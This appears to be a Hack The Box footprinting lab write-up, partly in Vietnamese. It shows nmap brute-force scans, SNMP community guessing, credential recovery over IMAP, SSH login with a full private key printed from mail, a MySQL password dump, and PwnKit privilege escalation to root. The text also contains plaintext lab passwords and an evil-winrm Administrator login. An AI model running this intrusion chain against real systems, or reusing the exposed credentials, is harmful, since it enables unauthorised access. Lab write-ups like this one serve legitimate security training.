❯ evil-winrm -u Administrator -p '87N1ns@slls83' -i 10.129.244.30
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
winmedium\administrator
```

happy hecking.......

# Footprinting Lab - Hard

The third server is an MX and management server for the internal network. Subsequently, this server has the function of a backup server for the internal accounts in the domain. Accordingly, a user named `HTB` was also created here, whose credentials we need to access.
Enumerate the server carefully and find the username "HTB" and its password. Then, submit HTB's password as the answer.

## Phân tích
- The third server is an MX and management server for the internal network
- this server has the function of a backup server for the internal accounts in the domain
- user named `HTB` was also created here

## Recon

### NMAP

TCP scanning:
```zsh
❯ sudo nmap -sS -p- -T 4 --min-rate 3000 10.129.202.20 -oN hardlab.txt -vv
PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack ttl 63
110/tcp open  pop3    syn-ack ttl 63
143/tcp open  imap    syn-ack ttl 63
993/tcp open  imaps   syn-ack ttl 63
995/tcp open  pop3s   syn-ack ttl 63
```

checked POP3/IMAP

```zsh
❯ nmap -p 143,993 --script=imap-* 10.129.202.20
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-01 03:06 EDT
NSE: [imap-brute] usernames: Time limit 10m00s exceeded.
NSE: [imap-brute] usernames: Time limit 10m00s exceeded.
NSE: [imap-brute] passwords: Time limit 10m00s exceeded.
Nmap scan report for 10.129.202.20
Host is up (0.29s latency).

PORT    STATE SERVICE
143/tcp open  imap
| imap-brute: 
|   Accounts: No valid accounts found
|_  Statistics: Performed 318 guesses in 633 seconds, average tps: 0.5
|_imap-capabilities: LITERAL+ post-login have SASL-IR ENABLE listed OK Pre-login LOGIN-REFERRALS IMAP4rev1 capabilities IDLE STARTTLS ID AUTH=PLAINA0001 more
993/tcp open  imaps
|_imap-capabilities: post-login ID SASL-IR ENABLE have OK listed LOGIN-REFERRALS IMAP4rev1 capabilities IDLE LITERAL+ Pre-login AUTH=PLAINA0001 more
| imap-brute: 
|   Accounts: No valid accounts found
|   Statistics: Performed 48 guesses in 324 seconds, average tps: 0.3
|_  ERROR: The service seems to have failed or is heavily firewalled...
```

```zsh
❯ nmap -p 110,995 --script=pop3-* 10.129.202.20
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-01 03:06 EDT
NSE: [pop3-brute] usernames: Time limit 10m00s exceeded.
NSE: [pop3-brute] usernames: Time limit 10m00s exceeded.
NSE: [pop3-brute] passwords: Time limit 10m00s exceeded.
NSE: [pop3-brute] usernames: Time limit 10m00s exceeded.
NSE: [pop3-brute] usernames: Time limit 10m00s exceeded.
NSE: [pop3-brute] passwords: Time limit 10m00s exceeded.
Nmap scan report for 10.129.202.20
Host is up (0.29s latency).

PORT    STATE SERVICE
110/tcp open  pop3
| pop3-brute: 
|   Accounts: No valid accounts found
|_  Statistics: Performed 182 guesses in 605 seconds, average tps: 0.4
|_pop3-capabilities: STLS SASL(PLAIN) USER CAPA TOP UIDL RESP-CODES PIPELINING AUTH-RESP-CODE
995/tcp open  pop3s
|_pop3-capabilities: USER CAPA TOP UIDL SASL(PLAIN) RESP-CODES PIPELINING AUTH-RESP-CODE
| pop3-brute: 
|   Accounts: No valid accounts found
|_  Statistics: Performed 436 guesses in 610 seconds, average tps: 0.6
```

UDP scanning:
```zsh
❯ sudo nmap -sU -p- -T 4 --min-rate 3000 10.129.202.20 -oN hardlab_UDP.txt -vv
PORT    STATE SERVICE REASON
161/udp open  snmp    udp-response ttl 63
```

This is `snmp v3`
```zsh
❯ nmap -sU -sV -p161 10.129.202.20

PORT    STATE SERVICE VERSION
161/udp open  snmp    net-snmp; net-snmp SNMPv3 server
```

### SNMP
```zsh
❯ onesixtyone -c /usr/share/wordlists/seclists/Discovery/SNMP/snmp-onesixtyone.txt 10.129.202.20
Scanning 1 hosts, 3218 communities
10.129.202.20 [backup] Linux NIXHARD 5.4.0-90-generic #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 x86_64
```

Từ phân tích đầu mục, đây là `backup server` do vậy và từ kết quả của `onesixtyone` từ khóa sẽ là `backup`:

### SNMP Enumeration

```zsh
❯ snmpbulkwalk -v2c -c backup 10.129.202.20
<snip>
iso.3.6.1.2.1.1.4.0 = STRING: "Admin <tech@inlanefreight.htb>"
iso.3.6.1.2.1.1.5.0 = STRING: "NIXHARD"
iso.3.6.1.2.1.1.6.0 = STRING: "Inlanefreight"
<snip>
iso.3.6.1.2.1.25.1.7.1.2.1.2.6.66.65.67.75.85.80 = STRING: "/opt/tom-recovery.sh"
iso.3.6.1.2.1.25.1.7.1.2.1.3.6.66.65.67.75.85.80 = STRING: "tom NMds732Js2761"
```

Để ý đến cả `/opt/tom-recovery.sh`

## Foothold

### Tried SSH password

Tôi đã thử ssh với password của tom nhưng có vẻ như nó yêu cầu chỉ được đăng nhập bằng khóa ssh:

```zsh
❯ ssh -v tom@10.129.202.20 -o PreferredAuthentications=password
debug1: Authentications that can continue: publickey
debug1: No more authentication methods to try.
tom@10.129.202.20: Permission denied (publickey).
```

### IMAP as tom user
Login credential: `tom:NMds732Js2761`
Để ý username và passw cách nhau 1 khoảng trắng, khả năng cao là thông tin đăng nhập của `IMAPS`.

```zsh
❯ openssl s_client -connect 10.129.202.20:imaps
1 LOGIN tom NMds732Js2761
1 OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE SORT SORT=DISPLAY THREAD=REFERENCES THREAD=REFS THREAD=ORDEREDSUBJECT MULTIAPPEND URL-PARTIAL CATENATE UNSELECT CHILDREN NAMESPACE UIDPLUS LIST-EXTENDED I18NLEVEL=1 CONDSTORE QRESYNC ESEARCH ESORT SEARCHRES WITHIN CONTEXT=SEARCH LIST-STATUS BINARY MOVE SNIPPET=FUZZY PREVIEW=FUZZY LITERAL+ NOTIFY SPECIAL-USE] Logged in

1 LIST "" *
* LIST (\HasNoChildren \UnMarked) "." Notes
* LIST (\HasNoChildren \UnMarked) "." Meetings
* LIST (\HasNoChildren \UnMarked) "." Important
* LIST (\HasNoChildren) "." INBOX

3 FETCH 1 (FLAGS BODY[HEADER.FIELDS (FROM SUBJECT DATE)] BODY[TEXT])
* 1 FETCH (FLAGS (\Seen) BODY[HEADER.FIELDS (FROM SUBJECT DATE)] {95}
From: [Admin] <tech@inlanefreight.htb>
Date: Wed, 10 Nov 2010 14:21:26 +0200
Subject: KEY

 BODY[TEXT] {3430}
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAgEA9snuYvJaB/QOnkaAs92nyBKypu73HMxyU9XWTS+UBbY3lVFH0t+F
+yuX+57Wo48pORqVAuMINrqxjxEPA7XMPR9XIsa60APplOSiQQqYreqEj6pjTj8wguR0Sd
hfKDOZwIQ1ILHecgJAA0zY2NwWmX5zVDDeIckjibxjrTvx7PHFdND3urVhelyuQ89BtJqB
abmrB5zzmaltTK0VuAxR/SFcVaTJNXd5Utw9SUk4/l0imjP3/ong1nlguuJGc1s47tqKBP
HuJKqn5r6am5xgX5k4ct7VQOQbRJwaiQVA5iShrwZxX5wBnZISazgCz/D6IdVMXilAUFKQ
X1thi32f3jkylCb/DBzGRROCMgiD5Al+uccy9cm9aS6RLPt06OqMb9StNGOnkqY8rIHPga
H/RjqDTSJbNab3w+CShlb+H/p9cWGxhIrII+lBTcpCUAIBbPtbDFv9M3j0SjsMTr2Q0B0O
jKENcSKSq1E1m8FDHqgpSY5zzyRi7V/WZxCXbv8lCgk5GWTNmpNrS7qSjxO0N143zMRDZy
Ex74aYCx3aFIaIGFXT/EedRQ5l0cy7xVyM4wIIA+XlKR75kZpAVj6YYkMDtL86RN6o8u1x
3txZv15lMtfG4jzztGwnVQiGscG0CWuUA+E1pGlBwfaswlomVeoYK9OJJ3hJeJ7SpCt2GG
cAAAdIRrOunEazrpwAAAAHc3NoLXJzYQAAAgEA9snuYvJaB/QOnkaAs92nyBKypu73HMxy
U9XWTS+UBbY3lVFH0t+F+yuX+57Wo48pORqVAuMINrqxjxEPA7XMPR9XIsa60APplOSiQQ
qYreqEj6pjTj8wguR0SdhfKDOZwIQ1ILHecgJAA0zY2NwWmX5zVDDeIckjibxjrTvx7PHF
dND3urVhelyuQ89BtJqBabmrB5zzmaltTK0VuAxR/SFcVaTJNXd5Utw9SUk4/l0imjP3/o
ng1nlguuJGc1s47tqKBPHuJKqn5r6am5xgX5k4ct7VQOQbRJwaiQVA5iShrwZxX5wBnZIS
azgCz/D6IdVMXilAUFKQX1thi32f3jkylCb/DBzGRROCMgiD5Al+uccy9cm9aS6RLPt06O
qMb9StNGOnkqY8rIHPgaH/RjqDTSJbNab3w+CShlb+H/p9cWGxhIrII+lBTcpCUAIBbPtb
DFv9M3j0SjsMTr2Q0B0OjKENcSKSq1E1m8FDHqgpSY5zzyRi7V/WZxCXbv8lCgk5GWTNmp
NrS7qSjxO0N143zMRDZyEx74aYCx3aFIaIGFXT/EedRQ5l0cy7xVyM4wIIA+XlKR75kZpA
Vj6YYkMDtL86RN6o8u1x3txZv15lMtfG4jzztGwnVQiGscG0CWuUA+E1pGlBwfaswlomVe
oYK9OJJ3hJeJ7SpCt2GGcAAAADAQABAAACAQC0wxW0LfWZ676lWdi9ZjaVynRG57PiyTFY
jMFqSdYvFNfDrARixcx6O+UXrbFjneHA7OKGecqzY63Yr9MCka+meYU2eL+uy57Uq17ZKy
zH/oXYQSJ51rjutu0ihbS1Wo5cv7m2V/IqKdG/WRNgTFzVUxSgbybVMmGwamfMJKNAPZq2
xLUfcemTWb1e97kV0zHFQfSvH9wiCkJ/rivBYmzPbxcVuByU6Azaj2zoeBSh45ALyNL2Aw
HHtqIOYNzfc8rQ0QvVMWuQOdu/nI7cOf8xJqZ9JRCodiwu5fRdtpZhvCUdcSerszZPtwV8
uUr+CnD8RSKpuadc7gzHe8SICp0EFUDX5g4Fa5HqbaInLt3IUFuXW4SHsBPzHqrwhsem8z
tjtgYVDcJR1FEpLfXFOC0eVcu9WiJbDJEIgQJNq3aazd3Ykv8+yOcAcLgp8x7QP+s+Drs6
4/6iYCbWbsNA5ATTFz2K5GswRGsWxh0cKhhpl7z11VWBHrfIFv6z0KEXZ/AXkg9x2w9btc
dr3ASyox5AAJdYwkzPxTjtDQcN5tKVdjR1LRZXZX/IZSrK5+Or8oaBgpG47L7okiw32SSQ
5p8oskhY/He6uDNTS5cpLclcfL5SXH6TZyJxrwtr0FHTlQGAqpBn+Lc3vxrb6nbpx49MPt
DGiG8xK59HAA/c222dwQAAAQEA5vtA9vxS5n16PBE8rEAVgP+QEiPFcUGyawA6gIQGY1It
4SslwwVM8OJlpWdAmF8JqKSDg5tglvGtx4YYFwlKYm9CiaUyu7fqadmncSiQTEkTYvRQcy
tCVFGW0EqxfH7ycA5zC5KGA9pSyTxn4w9hexp6wqVVdlLoJvzlNxuqKnhbxa7ia8vYp/hp
6EWh72gWLtAzNyo6bk2YykiSUQIfHPlcL6oCAHZblZ06Usls2ZMObGh1H/7gvurlnFaJVn
CHcOWIsOeQiykVV/l5oKW1RlZdshBkBXE1KS0rfRLLkrOz+73i9nSPRvZT4xQ5tDIBBXSN
y4HXDjeoV2GJruL7qAAAAQEA/XiMw8fvw6MqfsFdExI6FCDLAMnuFZycMSQjmTWIMP3cNA
2qekJF44lL3ov+etmkGDiaWI5XjUbl1ZmMZB1G8/vk8Y9ysZeIN5DvOIv46c9t55pyIl5+
fWHo7g0DzOw0Z9ccM0lr60hRTm8Gr/Uv4TgpChU1cnZbo2TNld3SgVwUJFxxa//LkX8HGD
vf2Z8wDY4Y0QRCFnHtUUwSPiS9GVKfQFb6wM+IAcQv5c1MAJlufy0nS0pyDbxlPsc9HEe8
EXS1EDnXGjx1EQ5SJhmDmO1rL1Ien1fVnnibuiclAoqCJwcNnw/qRv3ksq0gF5lZsb3aFu
kHJpu34GKUVLy74QAAAQEA+UBQH/jO319NgMG5NKq53bXSc23suIIqDYajrJ7h9Gef7w0o
eogDuMKRjSdDMG9vGlm982/B/DWp/Lqpdt+59UsBceN7mH21+2CKn6NTeuwpL8lRjnGgCS
t4rWzFOWhw1IitEg29d8fPNTBuIVktJU/M/BaXfyNyZo0y5boTOELoU3aDfdGIQ7iEwth5
vOVZ1VyxSnhcsREMJNE2U6ETGJMY25MSQytrI9sH93tqWz1CIUEkBV3XsbcjjPSrPGShV/
H+alMnPR1boleRUIge8MtQwoC4pFLtMHRWw6yru3tkRbPBtNPDAZjkwF1zXqUBkC0x5c7y
XvSb8cNlUIWdRwAAAAt0b21ATklYSEFSRAECAwQFBg==
-----END OPENSSH PRIVATE KEY-----
)
3 OK Fetch completed (0.001 + 0.000 secs).
```

Đây có lẽ là khóa ssh để đăng nhập với người dùng `tom`.

### SSH as `tom`

```zsh
❯ chmod 600 id_rsa && ssh -i id_rsa tom@inlanefreight.htb
Last login: Tue Apr  1 07:42:52 2025 from 10.10.14.188
tom@NIXHARD:~$ 
```

## Explore the system

```zsh
tom@NIXHARD:~$ sudo -l
[sudo] password for tom: 
Sorry, user tom may not run sudo on NIXHARD.
```

I found a `.mysql_history` seem interesting

```zsh
tom@NIXHARD:~$ ls -la
total 48
drwxr-xr-x 6 tom  tom  4096 Nov 10  2021 .
drwxr-xr-x 5 root root 4096 Nov 10  2021 ..
-rw------- 1 tom  tom   537 Apr  1 07:43 .bash_history
-rw-r--r-- 1 tom  tom   220 Nov 10  2021 .bash_logout
-rw-r--r-- 1 tom  tom  3771 Nov 10  2021 .bashrc
drwx------ 2 tom  tom  4096 Nov 10  2021 .cache
drwx------ 3 tom  tom  4096 Nov 10  2021 mail
drwx------ 8 tom  tom  4096 Apr  1 07:45 Maildir
-rw------- 1 tom  tom   169 Nov 10  2021 .mysql_history
-rw-r--r-- 1 tom  tom   807 Nov 10  2021 .profile
drwx------ 2 tom  tom  4096 Nov 10  2021 .ssh
-rw------- 1 tom  tom  2018 Nov 10  2021 .viminfo
tom@NIXHARD:~$ cat .mysql_history 
_HiStOrY_V2_
show\040databases;
select\040*\040from\040users;
use\040users;
select\040*\040from\040users;
show\040databases;
use\040users;
select\040*\040from\040users;
```

### MySQL

Đang có mysql chạy trên 3306 và 33060 ports, vậy chắc chắn người dùng `HTB` và mật khẩu là thứ chúng ta tìm kiếm đang ở đây
			
![](<./images/4.png>)
Thử kết nối với mysql bằng thông tin đăng nhập của `tom`
```zsh
tom@NIXHARD:~$ mysql -u tom -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 11
Server version: 8.0.27-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2021, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> 
```

Rất dễ dàng, giờ chỉ cần tìm thứ chúng ta cần:

```sql
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| users              |
+--------------------+
mysql> select username, password from users.users where username = 'HTB';
+----------+------------------------------+
| username | password                     |
+----------+------------------------------+
| HTB      | cr3n4o7rzse7rzhnckhssncif7ds |
+----------+------------------------------+
1 row in set (0.00 sec)
```

Vậy là xong bài lab, nhưng nếu bạn muốn lên root thì đơn giản chỉ cần dùng `PwnKit`

```zsh
tom@NIXHARD:~$ chmod +x PwnKit 
tom@NIXHARD:~$ ./PwnKit 
root@NIXHARD:/home/tom# id
uid=0(root) gid=0(root) groups=0(root),119(mysql),1002(tom)
root@NIXHARD:/home/tom# 
```
Happy Hecking...............